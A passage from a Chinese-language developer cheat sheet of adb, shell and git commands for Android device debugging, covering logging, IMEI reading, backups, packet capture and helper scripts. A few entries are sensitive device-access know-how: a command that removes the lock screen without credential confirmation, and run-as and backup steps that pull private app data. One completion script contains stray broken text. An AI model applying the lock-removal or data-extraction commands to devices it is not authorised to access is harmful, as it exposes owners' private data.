adb shell getenforce 可以获取当前的selinux的模式
```

## [CMD] 查看cpu信息

```text bash
adb shell cat /proc/cpuinfo
```

## [CMD] 查看分区信息

```text
adb shell cat /proc/partitions
```

## [CMD] adb相关命令

```text
adb shell ls -aal dev/pm ---> 会把dev/pm文件的权限路径等显示出来
adb shell find system -name "*app*" ----> 会把system下名字中有app的都显示出来，需要会使用*
adb logcat | egrep -i "nfc|nxp|AEE_AEDV|ERR"   ---> 抓取log时可以查找多个关键字
依次执行如下两个指令打开mobilelog及taglog
adb shell am broadcast -a com.mediatek.mtklogger.ADB_CMD -e cmd_name switch_taglog --ei cmd_target 1
adb shell am broadcast -a com.mediatek.mtklogger.ADB_CMD -e cmd_name start --ei cmd_target 1
```

## [CMD] adb 无法连接问题排查

```text
确认usb debugging有开启;

确认PC adb driver有安装;
可能出现VID/PID未添加导致PC不识别： 
文件： android_winusb.inf：
可能用到如下的写法：
%CompositeAdbInterface% = USB_Install, USB\VID_0E8D&PID_201D
上面这种可能出现driver无法正常安装的情况，必须把最后的MI_XXX也加上(MI_00从设备管理器硬件ID确认)：
%CompositeAdbInterface% = USB_Install, USB\VID_0E8D&PID_201D&MI_00

adb kill-server/start-server重启PC adb server.

排除第三方软件干扰adb server: 比如豌豆荚等.
因为豌豆荚会强占某端口，比如5037端口，导致包括GAT和adb client都没法正常连接到adb server. 可以尝试卸载豌豆荚.

确认adb version是新版本：
如果版本较旧，请更新GAT或者单独下载adb包，并加入adb.exe所在路径到环境变量中(建议加到最开始避免其他位置的adb.exe被混用).

交叉测试： Device1 + PC1 ,  Device1 + PC2,   PC1 + Device1, PC1 + Device2  确认可能是PC还是Device的问题.

确认adb版本没被混用：
不同的三方软件或者包括GAT等都会单独包含一份adb.exe(及相关dll)， 所以很可能出现这个进程用的xxxx1/adb.exe, 另外进程使用的是xxxx2/adb.exe, 造成不预期的问题.
可能出现系统路径  XXX:\Windows\System32 存在adb.exe,  恰好在此路径下执行adb, 会优先执行此路径的adb.exe, 而不会执行上面环境变量adb.exe第一个所在路径.
windows系统通过PATH寻找可执行文件的方式与类unix系统不同，比如linux完全从环境变量PATH中找，而windows会优先从当前目录找, 所以需要注意.
windows系统可执行文件一般有扩展名，即环境变量：PATHEXT. 
一般会是.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC.
所以如果存在adb.com, 会优先于adb.exe执行.  如果根本没有跑adb.exe, 尝试从这个方向去查.
如果想确认adb.exe进程对应的可执行文件的准确路径，可通过任务管理器查看: 映像路径名称/命令行.

更换USB线测试.
usb cable质量偏差和连接不良.


PC主机前面的USB Port可能出现供电问题，后面的USB Port供电更稳定：
如出现某个Port始终无法识别，可能是因为之前使用的设备抽电过多导致PC disable此端口，此时建议切换到主机后面的另外一个USB Port.


如果是fastboot模式不能识别:
请尝试用最新google fastboot 工具包;
已有实例确认旧版本fastboot只能识别某些特定的VID/PID, 新版本已修正. 在linux系统可以更新新版本的fastboot.
设备管理器VID/PID如果是0BBD/0C01, 请尝试在android_winusb.inf中增加再更新driver.


排除PC端安装不同来源/不同版本的usb driver导致问题.
请使用干净的PC环境安装MTK SP Driver确认是否可以识别到.


某些usb组合模式，如rndis,adb出现问题:
已查明rndis PC端驱动版本过旧可能导致识别问题：

请卸载rndis驱动，重新更新最新驱动.
重新安装MTK SP Driver.
重启PC.
```

## [知识点]  SKU?

```text
SKU，是商品的具体型号，比如“白色-iphone6-64G-国行-联通版”；
```

## [知识点]  小区广播CellBroadcast

```text
1. 什么是小区广播
Spec Document : 3GPP TS 23.041
小区广播是短信的一种类型，但有别于普通的点对点短信。
一般的点对点短消息(Short Message Service - Point to Point, SMS-PP)只能传送短消息给一个或少数几个收件人，
但是小区广播技术则是被设计为能够在特定区域中，按照指定的频道(Channel)来广播消息，让许多使用者同时接收到同样的消息。
因此手机仅是开启CB功能，开启Channel，被动接收来自相应Channel的小区广播消息。

2. 如何测试小区广播
接收端：
手机作为终端只是被动接收小区广播消息，前提是手机要开启CB功能，并且开启相应的CB Channel.
手机设置路径：Mms -> Settings -> General -> Cell broadcast settings -> Enable Cell broadcast -> Add Channel

发送端：
由于国内运营商目前不支持小区广播，因此国内实网下无法测试，需要在实验室搭建环境测试或者找国外测试人员，
实验室使用仪表一般都是安立，anite，R&S罗德，安捷伦等。
```

## [CMD] 获取 IMEI 码

```text
// 单卡
adb shell service call iphonesubinfo 1

// 双卡
adb shell service call iphonesubinfo 4 i32 0
adb shell service call iphonesubinfo 4 i32 1

通过正则表达式，将获取到的imei匹配出来：
adb shell service call iphonesubinfo 1 | awk -F "'" '{print $2}' | sed '1 d' | tr -d '.' | awk '{print}' ORS=
```

## [CMD] 获取 IP 地址

```text
adb shell ifconfig | grep Mask
```

## [CMD] content 命令的使用

```text
adb shell content query --uri content://settings/system --where "_id=1"
```

## [CMD] 手动编译 Java 文件生成 .class 再编译成 .dex 文件并push到 /data/local/tmp 运行

```text
Main.java
public class Main {
    public static void main(String[]  args) {
        System.out.println("hello world");
    }
}

// 用 javac 编译生成 .class 字节码文件
javac Main.java

// 用 dx 把 .class 字节码文件编译成 .dex 文件 (dx 文件路径 ~/Android/Sdk/build-tools/27.0.3/dx)
dx --dex --output=Main.dex Main.class

adb push Main.dex /data/local/tmp/

// 用 dalvikvm 运行 Main.dex
adb shell dalvikvm -cp /data/local/tmp/Main.dex Main

// 或用 app_process 运行 dex 文件
adb shell app_process -Djava.class.path=/data/local/tmp/hello.dex /data/local/tmp shellService.Main
```

## [CMD] 查看应用的 userid

```text
adb shell cat /data/system/packages.xml | grep "com.android.mms"
<package name="com.android.mms" codePath="/system/priv-app/MtkMms" nativeLibraryPath="/system/priv-app/MtkMms/lib" publicFlags="940097125" privateFlags="8" pkgFlagsEx="0" ft="16bda77f4d8" it="16bda77f4d8" ut="16bda77f4d8" version="27" sharedUserId="10020" isOrphaned="true">

adb shell ps | grep "u0"
u0_a20       19013   315 1090980  44876 SyS_epoll_wait aa022c00 S com.android.mms

a20 就是对应的 10020
```

## [CMD] adb backup 备份命令

```text
adb backup -f backup.ab com.whatsapplock

备份出来的是 .ab 格式的压缩包，需要用 adbextractor 工具打开 或 https://github.com/nelenkov/android-backup-extractor

http://sourceforge.net/projects/adbextractor/

java -jar abe.jar -debug unpack backup.ab backup.tar

pax -r < backup.tar
```

## [CMD] 利用run-as命令在不root情况下读取data下面的数据

```text
over@over-ThinkPad-R52:~$ adb shell
$ run-as com.package
$ cd /data/data/com.package
$ ls
databases
lib
$ cd databases
$ ls
preferences.db
$ cat preferences.db > /mnt/sdcard/preferences1.db

代码说明：

注意com.package换成自己的完整包名，关键是run-as命令，最后使用cat命令把数据库拷贝到sd卡下面。
二、补充

同事分享/data/data/package/lib这个目录是可以直接访问的，也就是说adb shell后虽然无法读取/data目录，但是可以直接访问这个目录下的文件，可以通过上面的run-as命令看得出其权限与其他目录的权限是不同的，为system权限，这为多apk共享so提供了便利，这也是Vitamio所使用的方式。

如果签名了并且指定设置了android:debuggable="false"将无法使用该命令。 

如何查看应用是否是 debuggable 的??adb shell cat /data/system/packages.xml | grep "debuggable"
也可以使用Android中的 dumpsys package 命令来查看指定应用的详细信息：

感谢网友分享（见评论），注意不要把adb shell 和 run-as作为一条命令一起执行，例如：adb shell run-as com.pack

三、参考文件 　　　　android上使用手機跑adb存取data資料夾[blogspot]  　　　　Why do I get access denied to data folder when using adb?

结束

关于共享数据也可以研究一下/data/data/package/files，使用openFileOutput的第二个参数来指定访问权限。事物总有其多面性，本文有鼓励窥视apk之嫌，方法分享给你，至于你用来做什么我可以
```

## [CMD] adb restore 还原命令 ????

## [CMD] 查看package列表

```text
adb shell pm list package 已废弃，改用 adb shell cmd package list
```

## [CMD] adb jdwp查看设备中可以被调试的应用的进程号

```text
adb jdwp
http://tinylab.org/use-jdb-to-debug-android-application/
```

## [CMD] dexdump 可以查看一个 dex 文件的相关信息

```text
dexdump classes.dex
```

## [CMD] tcpdump

```text
adb push tcpdump /data/local/tmp

chmod 755 tcpdump

./tcpdump -v -s 0 -w traffic.pcap

• -v is to provide verbose output
• -s is to snarf the number of bytes specified
• -w is to write the packets into a file

adb pull /data/local/tmp/traffic.pcap

用 Wireshark 打开 .pcap 文件

可以上传 apk 到 http://sanddroid.xjtu.edu.cn/ 进行分析
```

## [CMD] 命令行解锁

```text
adb shell am start -n com.android.settings/com.android.settings.password.ChooseLockGeneric --ez confirm_credentials false --ei lockscreen.password_type 0 --activity-clear-task
```

## [CMD] adb shell打印内核日志

```text
adb shell dmesg
adb shell cat /proc/kmsg

输出示例：

<6>[14201.684016]  PM: noirq resume of devices complete after 0.982 msecs
<6>[14201.685525]  PM: early resume of devices complete after 0.838 msecs
<6>[14201.753642]  PM: resume of devices complete after 68.106 msecs
<4>[14201.755954]  Restarting tasks ... done.
<6>[14201.771229]  PM: suspend exit 2016-08-28 13:31:32.679217193 UTC
<6>[14201.872373]  PM: suspend entry 2016-08-28 13:31:32.780363596 UTC
<6>[14201.872498]  PM: Syncing filesystems ... done.
中括号里的 [14201.684016]  代表内核开始启动后的时间，单位为秒。

通过内核日志我们可以做一些事情，比如衡量内核启动时间，在系统启动完毕后的内核日志里找到 Freeing init memory 那一行前面的时间就是。
```

## [CMD] adb reboot 的几个命令

```text
adb reboot
adb shell reboot -p   //关机
//adb shell svc power shutdown      //关机2:这个命令貌似没用
adb reboot recovery
adb reboot fastboot
adb reboot bootloader
```

## [CMD] 设置android网络代理，这个有什么用?

```text
设置代理：
adb shell settings put global http_proxy ip:port
adb shell settings put global http_proxy 127.0.0.1:8888
移除代理：
adb shell settings delete global http_proxy
adb shell settings delete global global_http_proxy_host
adb shell settings delete global global_http_proxy_port

其实还可以安装第三方应用实现代理功能，不过没什么意义，上述两种方法基本可以解决大部分场景
```

## [CMD] 查看内存占用前10的进程

```text
        ps -aux | sort -k4nr | head -n 10

adb shell ps -A | sort -k4nr | head -n 10
```

## [CMD] 如何测量一个应用的启动时间

```text
adb shell am start -W com.android.settings/.Settings
```

## [CMD] adb shell 直接执行 sqlite3 查询数据库的命令

```text
adb shell sqlite3 /data/user_de/0/com.android.providers.telephony/databases/telephony.db "'select * from carriers;'" > db1.log
adb pull /data/user_de/0/com.android.providers.telephony/databases/telephony.db
```

## [CMD] adb uiautomator dump布局

```text
adb shell uiautomator dump
adb exec-out uiautomator dump /dev/tty

dump 出来的文件怎么看??
```

## [CMD] adb shell am kill 包名

```text
adb shell am kill com.android.contacts
貌似不起作用
```

## [CMD] 我们在开发Android应用的时候如果程序崩溃了最快的查看异常信息的方法就是用日志过滤方式

```text
adb logcat -s AndroidRuntime
```

## [CMD] 可以查看指定包名应用的数据库存储信息(包括存储的sql语句)

```text
adb shell dumpsys dbinfo [packagename] 

adb shell dumpsys dbinfo com.android.launcher3
有些模块不行，不知道为什么?
```

## [CMD] aapt

```text
aapt dump xmltree applock.apk AndroidManifest.xml > demo.txt
```

## [CMD] 查看当前activity

```text
adb shell dumpsys window | grep "mCurrentFocus"
```

## [CMD] 模拟高温报警命令

```text bash
adb shell "echo 55 > /sys/devices/platform/battery/Battery_Temperature"
adb shell am broadcast -a com.sagereal.SHOW_HEIGHT_TEMPERATURE_WARNING
adb shell input keyevent 140  //发送键值F10
通过 event 事件模拟按键，通过 adb shell getevent 获取 event0
adb shell sendevent /dev/input/event0 1 $2 1
adb shell sendevent /dev/input/event0 0 0 0
adb shell sendevent /dev/input/event0 1 $2 0
adb shell sendevent /dev/input/event0 0 0 0
```

## [CMD] 通过 adb 抓取 radio log

```text bash
查看包含在无线/电话相关的缓冲区消息
adb logcat -b radio

查看事件相关的消息
adb logcat -b events

查看主缓冲区 (默认缓冲区)
adb logcat -b main

adb logcat 的用法
https://developer.android.com/studio/command-line/logcat?hl=zh-cn
```

## [CMD] adbkill 脚本

```text bash
adb shell kill `adb shell ps | grep $1 | awk {'print $2'} | head -n 1`;

adb shell pidof com.android.systemui | xargs adb shell kill -9

#!/bin/bash
PID=`adb shell ps | grep $1 | awk '{print $2}'`
echo "adb shell kill $1 : $PID"
result=`adb shell kill $PID`
echo "$result"
```

## [CMD] 更新jdk版本

```text bash
sudo update-alternatives --config java
sudo update-alternatives --config javac
```

## [CMD] head | sort

```text
head命令 用来显示档案的开头至标准输出中。

sort命令用于将文本文件内容加以排序。sort可针对文本文件的内容，以行为单位来排序。

# 查看前5行内容 -n  num：显示每个文件的前num 行内容
[root@localhost best] # head -n 5 besthappyday
0315 happy
0812 happy
0201 happy
0403 happy
9046 happy

# 排序一下
[root@localhost best] # head -n 5 besthappyday | sort
0201 happy
0315 happy
0403 happy
0812 happy
9046 happy
```

## [CMD] zgrep | zcat

```text
避免解压文件，可以使用zgrep命令查找文件内容信息、zcat查看压缩文件中的信息。
```

## [CMD] 查看apk签名??

```text
jarsigner -verify -verbose -certs ${your_apk} > log.txt
```

## [CMD] 查看文件夹占用磁盘空间大小

```text bash
du -h --max-depth=1
```

## [CMD] 通过命令查看每个文件夹的大小

```text
du -d 1 data/
```

## [CMD] 通过终端找字符串

```text bash
find . | xargs grep -n --color "orange"
grep "字符" ./ -r(./代表当前文件夹，-r代表遍trunk历)
```

## [CMD] sed : linux下替换某些文件中的某些字符

```text bash
格式: sed -i "s/查找字段/替换字段/g" `grep 查找字段 -rl 路径`
sed -i "/MTK_VOLTE_SUPPORT =/s/=.*/= no/" ----->  sed -i "/查找字段/s/需要替换的字段/想要替换成的结果/
```

## [CMD] ascii : 使用终端查看ascii码

```text
在终端中输入man ascii，然后hex列代表16进制，比如说那边写的31，我们在代码中使用要写0x31;Dec列为10进制，可以直接写
```

## [CMD] git 终端显示颜色

```text
git config --global color.ui true
其他一些git配置可以在 .gitconfig 中查看和设置
```

## [CMD] git 清空环境

```text bash
git reset --hard HEAD && git clean -xdf && git pull && git status
```

## [CMD] aapt解析apk文件

```text
拷贝一个alps/out/host/linux-x86/bin/aapt文件到apk同目录下
进入apk同目录打开终端，
1、chmod 777 aapt
2、
aapt dump badging DeskClock.apk  > log.txt，然后就可以在log.txt文件中看到很多该apk的数据，只是看部分apk信息建议用这个方法
aapt l -a DeskClockGoogle.apk > log.txt  ，解析了所有的apk信息
aapt dump resources DeskClockGoogle.apk > log_res.txt，解析了该apk的资源文件信息

aapt d permissions example.apk //显示这个apk所添加的权限
aapt d xmltree example.apk AndroidManifest.xml //查看apk压缩文件中AndroidManifest.xml内容
```

## [CMD] pgrep 查看 ubuntu 下进程id

```text
pgrep eclipse
```

## [CMD] alias, 常用命令的别名，添加到 ~/.bashrc 中

```text
alias screenshot="adb exec-out screencap -p > screen-$(date -j "+%s").png"
alias startintent="adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X shell am start $1"
alias apkinstall="adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X install -r $1"
alias rmapp="adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X uninstall $1"
alias clearapp="adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X shell pm clear $1"
alias findm="grep -rnws --include='*.[mb]  [kp] ' 'LOCAL_MODULE\|LOCAL_PACKAGE_NAME\|name:'"
```

## [CMD] 批量转图片格式

```text
mogrify -path newdir -format png *.jpg
这个命令的作用，是将当前目录下的所有 jpg文件，转换为 png 格式，并将其存放在 newdir 目录下
```

## [CMD] android.util.Log.isLoggable("volume", Log.DEBUG)

```text
打开 log
adb shell setprop log.tag.volume D ，重启之后失效
也可以把 log.tag.volume=D 写入到 /data/local.prop 或 /system/build.prop 文件中，这样重启也不会失效

adb shell stop
adb shell start

adb shell stop会杀掉zygote进程以及所有由zygote孵化而来的子进程。adb shell start则会重启zygote进程，再由zygote进程启动其它Android核心进程。当zygote重新启动时，会重新加载framework相关资源，而此时属性已经设置。
```

## [CMD] 快速填充rom

```text
dd
用指定大小的块拷贝一个文件，并在拷贝的同时进行指定的转换。
注意：指定数字的地方若以下列字符结尾，则乘以相应的数字：b=512；c=1；k=1024；w=2
参数注释：
1. if=文件名：输入文件名，缺省为标准输入。即指定源文件。< if=input file >
2. of=文件名：输出文件名，缺省为标准输出。即指定目的文件。< of=output file >

dd if=/dev/hdb of=/dev/hdd
将本地的/dev/hdb整盘备份到/dev/hdd

adb shell dd if=/dev/zero of=/sdcard/test bs=1G count=8

BAT脚本
@echo off 
adb wait-for-device 
echo 当前手机可用内存如下
adb shell df -h /data/media
set /p name=输入文件名称 注意 名称重复会覆盖原文件:
set /p count=输入需要填充的文件大小 单位为M/1024M=1G:
adb shell dd if=/dev/zero of=/sdcard/test%name% bs=1024000 count=%count%
echo 填充完毕 
echo 请问是否继续填充?按任意键继续填充
pause > nul
echo 继续填充请不要输入相同名称文件
set /p name=输入文件名称 注意 名称重复会覆盖原文件:
set /p count=输入需要填充的文件大小 单位为M/1024M=1G:
adb shell dd if=/dev/zero of=/sdcard/test%name% bs=1024000 count=%count%
```

## [CMD] adb shell 调试 Android 串口

```text
Android手机上很多外设是串口连接到AP的，如modem，gps。为了调试这些串口，通常需要将它们飞线接出来，用pc的串口连接调试。这样比较麻烦。
在adb  shell里是可以直接调试串口的，就不用飞线了，还可以验证Android串口配置是否正确。
用usb连接Android设备调试后，在pc端输入 adb shell，连接成功后，先停止一些可能占用端口的服务，如：
stop ril-daemon停掉ril后台
然后：
busybox microcom -t 15000 -s 115200 /dev/ttyS0
-t 单位毫秒，无操作自动退出时间。
-s 单位bps，串口波特率。
ttyS0 要操作的串口。

然后打开另一个命令行窗口，输入：

adb shell cat /dev/ttyS0

然后可以在第一个窗口输入命令，在第二个窗口可以看到命令和响应。
如果没有响应，请检查Android串口配置是否正确，串口号是否对，波特率是否正确。
microcom的-t设置要合理，太短，输入命令可能输入不完就退出了，太长要等很久才退出。
必须先执行第一个窗口，再执行第二个窗口，因为不设置波特率，第二个窗口显示会有问题。
第一个窗口microcom退出后，也可以用以下方法发送命令到串口：
echo -e "AT\r\n">/dev/ttyS0
```

## [CMD] Android 高版本(8、9、10)查看手机中进程信息、线程信息

```text
ps -T -A
```

## [CMD] 正则表达式之密码校验（检验密码是含有小写字母、大写字母、数字、特殊符号的两种及以上）

```text
^(?![A-Z] +$)(?![a-z] +$)(?!\d+$)(?![\W_] +$)\S{6,16}$
```

## [CMD]  [script] 模仿fastboot 添加 completion

```text
2. 在 /usr/share/bash-completion/completions/fastboot 路径下创建 fastboot 脚本

_fastboot()  
{
    local cur prev opts
    COMPREPLY=()
    cur="${COMP_WORDS[COMP_CWORD] }"
    prev="${COMP_WORDS[COMP_CWORD-1] }"
    opts="reboot boot flash devices -w reboot-bootloader"

    case "$prev" in
    reboot | devices | -w | reboot-bootloader)
        COMPREPLY=()
        return 0
        ;;
    flash)no permissions
        COMPREPLY=( $(compgen -W "boot system recovery radio userdata rpm sbl1 modem tz persist splash aboot" -- $cur ))
        return 0
        ;;
    boot)
        COMPREPLY=( $(compgen -o filenames -G "${cur}*.img"))
        return 0
        ;;
    *)
        local prev2="${COMP_WORDS[COMP_CWORD-2] }"
        local prev3="${COMP_WORDS[COMP_CWORD-3] }"
        if [ "$prev2" == "flash" ] ;then
            COMPREPLY=( $(compgen -o filenames -G "${cur}*.img"))
            return 0
        elif [ "$prev2" == "boot" ] ;then
            COMPREPLY=()
            return 0
        elif [ "$prev3" == "flash" ] ;then
            COMPREPLY=()
            return 0
        fi
        ;;
    esac

    COMPREPLY=( $(compgen -W "$opts" -- $cur) )
    return 0
}
complete -F _fastboot fastboot
```

## [CMD] 一些调试命令

```text
调试不能开机的命令
打开aee
adb shell aee -m 3
抓取rtt Log
adb shell rtt -f bt -p $system_server_pid > rtt.txt

调试查看Emmc性能相关命令
adb shell cat /sys/block/mmcblk0/device/cid
查看物料型号，可以确认是否是同一批次的物料
adb shell cat /sys/kernel/debug/mmc0/ios
查看Emmc相关的参数信息
mount
df

启动悬浮窗
adb shell am start-activity -n com.transsion.calculator/.Calculator --windowingMode 5

查找并替换所有字符串
sed -i 's/oldstring/newstring/g' `grep oldstring -rl .`

cp -R `egrep -Rl "securitycom" ./modified_files` ../patch/

删除find符合条件的文件和文件夹：
find out/ -name "*framework-res*" -exec rm -rf "{}" \;

统计文件夹下的所有Java文件行数
find . -name "*.java" | xargs cat | grep -v ^$ | wc -l
```

## [CMD] arm-linux-androideabi-addr2line 转行脚本

```text
#!/usr/bin/python  
# stack symbol parser  

import os
import string
import sys

ANDROID_TARGET_OUT = os.getcwd()+"/"

# addr2line tool path and symbol path  
addr2line_tool = 'arm-linux-androideabi-addr2line'
symbol_dir = ANDROID_TARGET_OUT + '/symbols'
symbol_bin = symbol_dir + '/system/bin/'
symbol_lib = symbol_dir + '/system/lib/'

class ReadLog:
    def __init__(self,filename):
        self.logname = filename  
    def parse(self):
        f = file(self.logname,'r')
        lines = f.readlines()
        if lines != [] :
            print 'read file ok'
        else:
            print 'read file failed'
        result =[] 
        for line in lines:
            if line.find('stack') != -1:
                print 'stop search'
                break
            elif line.find('system') != -1:
                #print 'find one item' + line
                result.append(line)
        return result

class ParseContent:
    def __init__(self,addr,lib):
            self.address = addr # pc address
            self.exename = lib  # executable or shared library
    def addr2line(self):
        cmd = addr2line_tool + " -C -f -s -e " + symbol_dir + self.exename + " " + self.address
        #print cmd
        stream = os.popen(cmd)
        lines = stream.readlines();
        list = map(string.strip,lines)
        return list

inputarg = sys.argv
if len(inputarg) < 2:
    print 'Please input panic log'
    exit()

filename = inputarg[1] 
readlog = ReadLog(filename)
inputlist = readlog.parse()

for item in inputlist:
    itemsplit = item.split()
    test = ParseContent(itemsplit[-2] ,itemsplit[-1] )
    list = test.addr2line()
    print "%-30s%s" % (list[1] ,list[0] )
```

## [CMD] git bisect 二分查找

```text
git bisect start
git bisect good
git bisect bad
git bisect reset
```

## [CMD] 测试apk的启动时间

```text python
#!/usr/bin/env python
'''
@author: guanglixiang@gmail.com
@summary: this script use to test launch activity time
'''

from commands import getoutput
from time import sleep
from __builtin__ import int

LAUNCH_PACKAGE = 'com.tct.email'
LAUNCH_ACTIVITY = 'com.tct.email/.activity.Welcome'
TEST_COUNT = 5 ＃测试次数
SLEEP_TIME = 10 #每次启动的时间间隔

LOG_LINE = "**************************************************"

def getVerInfo():
    getVerCmd = "adb shell dumpsys package %s | grep version" % (LAUNCH_PACKAGE)
    verinfo = getoutput(getVerCmd)
    print LOG_LINE
    print "Test APK version info is:"
    print verinfo.strip()
    print LOG_LINE

def getLaunchTime():
    getLaunchTimeCmd = "adb shell am start -W -S %s |grep TotalTime|awk '{print $2}'" % (LAUNCH_ACTIVITY)
    totalTime = 0
    for i in range(1, TEST_COUNT + 1):
        time = getoutput(getLaunchTimeCmd)
        print "%s lunch time is %s" % (i, time)
        totalTime += int(time)
        if (i < TEST_COUNT):
            sleep(SLEEP_TIME)
        i = i + 1
    average = totalTime / TEST_COUNT
    print "%s launch time average is %s" % (TEST_COUNT, average)

def main():
    getVerInfo()
    getLaunchTime()

if __name__ == '__main__':
    main()
```

## [CMD] flashtool终端使用

```text
flash_tool --help

flash_tool_path=/home/zq/tools/SP_Flash_Tool_v5.1944_Linux;
$flash_tool_path/flash_tool -d $flash_tool_path/MTK_AllInOne_DA.bin -s ../$new_project/MT6580_Android_scatter.txt -c format-download -t auto -b;
```

## [CMD] if else的另一种写法，类似于三元运算符 ?

```text
[[ "foo" == "Foo" ] ]  && echo "match" || echo "notmatch"
```

## [CMD] 分析模块编译文件中的直接push+kill

```text
log_file=mm_build_CMASReceiver.log;export target_project=k80hd_bsp_fwv_512m;cat $log_file | grep "Install:" -i | awk -F $target_project '{mTarget=$2;system("export apkpath=out/target/product/$target_project"mTarget";echo $apkpath;adb push $apkpath "mTarget";echo push done $apkpath;export packagename=`aapt dump badging $apkpath | grep package | awk {'\''print $2'\''} | awk -F = {'\''print $2'\''} | awk -F '\\\\\'' {'\''print $2'\''}`;export pid=`adb shell pidof -s $packagename`;echo $pid;adb shell kill $pid;echo $packagename;")}';
```

## [CMD] adb shell service call vibrator 1 方法的解释

```text
通过 adb shell service list 查看 service 列表
找到 vibrator 的 service 如下
108 vibrator: [android.os.IVibratorService] 
然后找到 IVibratorService 文件 frameworks/base/core/java/android/os/IVibratorService.aidl
interface IVibratorService
{
    boolean hasVibrator();
    boolean hasAmplitudeControl();
    void vibrate(int uid, String opPkg, in VibrationEffect effect, int usageHint, String reason, IBinder token);
    void cancelVibrate(IBinder token);
}
里面有4个方法 adb shell service call vibrator 1 中的"1" 就表示调用 IVibratorService 的第一个方法 hasVibrator()，调用之后显示结果如下:
Result: Parcel(00000000 00000001   '........')
这个结果应该就表示有震动马达

其他 service 的调用方法
adb shell service call clipboard 8 s16 "first_argument" i32 12 i32 1
这里i32代表整数，s16代表字符串。我们甚至可以将布尔值作为整数传递，如示例所示。
在布尔整数中，1代表true，0代表false。

adb shell service call mouse 2 i32 1
调用自己写的 mouseservice 中的第二个方法 showMouse,但没有显示鼠标
```

## [CMD] 通过 service call 命令调用 phone 的 AIDL 服务

```text
mTelephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
mTelephonyManager.setPreferredNetworkType(subId, selectNetworkMode);

Context.java
public static final String TELEPHONY_SERVICE = "phone";

通过 service list 查找 phone 服务对应的 aidl
adb shell service list | grep "phone"
phone: [com.android.internal.telephony.ITelephony] 

ff ITelephony.aidl
frameworks/base/telephony/java/com/android/internal/telephony/ITelephony.aidl

在 ITelephony.aidl 文件中找到 setPreferredNetworkType 方法对应的序号是 104
boolean setPreferredNetworkType(int subId, int networkType);

根据方法中的参数可以看到需要一个 subId(可以在 /data/data/com.android.provider.telephony 下的数据库中看到对应sim卡的subid)，一个networkType(在 NetworkSelectingActivity.java 文件中)
public static final int WCDMA_PREFERRED = TelephonyManager.NETWORK_MODE_WCDMA_PREF; // 0
public static final int GSM_ONLY = TelephonyManager.NETWORK_MODE_GSM_ONLY; // 1
public static final int WCDMA_ONLY = TelephonyManager.NETWORK_MODE_TDSCDMA_WCDMA; // 14
public static final int GSM_WCDMA_AUTO = TelephonyManager.NETWORK_MODE_TDSCDMA_GSM_WCDMA; // 18
public static final int CDMA_EVDO = TelephonyManager.NETWORK_MODE_CDMA_EVDO; // 4
public static final int CDMA_ONLY = TelephonyManager.NETWORK_MODE_CDMA_NO_EVDO; // 5
public static final int EVDO_ONLY = TelephonyManager.NETWORK_MODE_EVDO_NO_CDMA; // 6
public static final int CDMA_EVDO_GSM_WCDMA = TelephonyManager.NETWORK_MODE_TDSCDMA_CDMA_EVDO_GSM_WCDMA;// 21
public static final int LTE_CDMA_EVDO = TelephonyManager.NETWORK_MODE_LTE_CDMA_EVDO; // 8
public static final int LTE_GSM_WCDMA = TelephonyManager.NETWORK_MODE_LTE_TDSCDMA_GSM_WCDMA;// 20
public static final int LTE_CDMA_EVDO_GSM_WCDMA = TelephonyManager.NETWORK_MODE_LTE_TDSCDMA_CDMA_EVDO_GSM_WCDMA;// 22
public static final int LTE_ONLY = TelephonyManager.NETWORK_MODE_LTE_ONLY; // 11
public static final int LTE_WCDMA = TelephonyManager.NETWORK_MODE_LTE_TDSCDMA_WCDMA; // 20
public static final int TDSCDMA_ONLY = TelephonyManager.NETWORK_MODE_TDSCDMA_WCDMA; // 14
public static final int GSM_TDSCDMA_AUTO = TelephonyManager.NETWORK_MODE_TDSCDMA_GSM_WCDMA; //18
public static final int NR_ONLY = TelephonyManager.NETWORK_MODE_NR_ONLY; //23
public static final int NR_LTE = TelephonyManager.NETWORK_MODE_NR_LTE; //24
public static final int NR_LTE_UTMS = TelephonyManager.NETWORK_MODE_NR_LTE_TDSCDMA_WCDMA; //31
public static final int NR_LTE_GSM_UTMS = TelephonyManager.NETWORK_MODE_NR_LTE_TDSCDMA_GSM_WCDMA; //32
public static final int NR_LTE_CDMA_EVDO_GSM_UTMS = TelephonyManager.NETWORK_MODE_NR_LTE_TDSCDMA_CDMA_EVDO_GSM_WCDMA;//33

所以需要把 subId = 1 的 networkType 设置为 GSM_ONLY 只需要调用
adb shell service call phone 104 i32 1 i32 1

其他 system 服务的一些方法也可以这么调用
```

## [CMD] am instrument 的使用

```text
adb shell am instrument -w com.android.smoketest.tests/android.test.InstrumentationTestRunner
```

## [CMD] shell对话框

```text
// 普通
whiptail --title "Message box title" --msgbox " Choose Ok to continue." 10 60

// Yes/No
#!/bin/bash
if (whiptail --title "Yes/No Box" --yesno "Choose between Yes and No." 10 60) then
    echo "You chose Yes. Exit status was $?."
else
    echo "You chose No. Exit status was $?."
fi

// 自定义对话框
#!/bin/bash
if (whiptail --title "Yes/No Box" --yes-button "Man" --no-button "Woman"  --yesno "What is your gender?" 10 60) then
    echo "You chose Man Exit status was $?."
else
    echo "You chose Woman. Exit status was $?."
fi

// 表单输入框
#!/bin/bash
NAME=$(whiptail --title "Free-form Input Box" --inputbox "What is your pet's name?" 10 60 Peter 3>&1 1>&2 2>&3)

exitstatus=$?
if [ $exitstatus = 0 ] ; then
    echo "Your name is:" $NAME
else
    echo "You chose Cancel."
fi

// 密码输入框
#!/bin/bash
PASSWORD=$(whiptail --title "Password Box" --passwordbox "Enter your password and choose Ok to continue." 10 60 3>&1 1>&2 2>&3)
 
exitstatus=$?
if [ $exitstatus = 0 ] ; then
    echo "Your password is:" $PASSWORD
else
    echo "You chose Cancel."
fi

// 菜单栏
#!/bin/bash
OPTION=$(whiptail --title "Menu Dialog" --menu "Choose your favorite programming language." 15 60 4 \
"1" "Python" \
"2" "Java" \
"3" "C" \
"4" "PHP"  3>&1 1>&2 2>&3)
 
exitstatus=$?
if [ $exitstatus = 0 ] ; then
    echo "Your favorite programming language is:" $OPTION
else
    echo "You chose Cancel."
fi

// 单选对话框
#!/bin/bash
DISTROS=$(whiptail --title "Test Checklist Dialog" --radiolist \
